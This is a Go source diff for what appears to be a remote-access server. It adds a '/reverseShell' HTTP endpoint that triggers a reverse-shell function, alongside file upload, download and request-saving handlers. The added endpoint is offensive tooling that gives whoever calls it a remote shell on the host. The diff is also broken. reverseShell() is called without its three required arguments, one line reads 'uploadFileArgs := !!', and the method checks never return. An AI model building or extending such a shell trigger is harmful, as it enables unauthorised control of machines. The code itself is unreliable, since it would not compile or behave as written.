@@ -20,7 +20,9 @@ import (
 func downloadFileHandler(w http.ResponseWriter, r *http.Request) {
 	wd, err := os.Getwd()
 	checkError(err, 0)
-
+	if r.Method != http.MethodGet {
+		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
+	}
 	// client := Headers - IP User-Agent
 
 	requestedURL := ""
@@ -71,6 +73,15 @@ func sha256AFile(filepath string) (result string, error) {
 	 return result, nil
 }
 
+func reverseShellHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
+	}
+
+	err := reverseShell()
+	checkError(err,0)
+}
+
 func reverseShell(shell,args, payload string) error {
 	os := runtime.GOOS
 	switch os {
@@ -96,11 +107,17 @@ func uploadFileHandler(w http.ResponseWriter, r *http.Request) {
 	tmpDir := os.TempDir()
 	fs := http.FileServer(http.Dir(tmpDir))
 	log.Printf("File server started at %s for uploading files\n", tmpDir)
-	
-	// publicKey Header
-	// filename Header
+	r.Header.Add()	
 
-	uploadFileArgs := w.Header().Get()
+
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
+	}
+	// publicKey Header
+	filename := r.PostFormValue("filename")
+	//fileSize := 
+	//mimeHeader := 
+	uploadFileArgs := !!
 
 	//log.Print("",  ) File upload request success
 	//log.Print("",  ) File upload INFO:
@@ -177,6 +194,9 @@ func uploadFileHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func saveReqBodyFileHandler(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
+	}
 	http.FileServer(http.Dir("/tmp"))
 	r.Body = http.MaxBytesReader(w, r.Body, 1048576)
 	builder := strings.Builder{}
@@ -191,7 +211,9 @@ func saveReqBodyFileHandler(w http.ResponseWriter, r *http.Request) {
 	f, err := os.Create(filepath)
 	checkError(err, 0)
 	defer f.Close()
-	f.WriteString(r.Body.Close().Error())
+	bodyBytes, err := io.ReadAll(r.Body)
+	checkError(err,0)
+	f.WriteString(string(bodyBytes))
 	f.Sync()
 
 	endTime := time.Now()
@@ -203,6 +225,7 @@ func createDefaultWebServerMux() *http.ServeMux {
 	mux.HandleFunc("/upload", uploadFileHandler)
 	mux.HandleFunc("/download", downloadFileHandler)
 	mux.HandleFunc("/saveReqBody", saveReqBodyFileHandler)
+	mux.HandleFunc("/reverseShell", reverseShellHandler)
 	return mux
 }
 
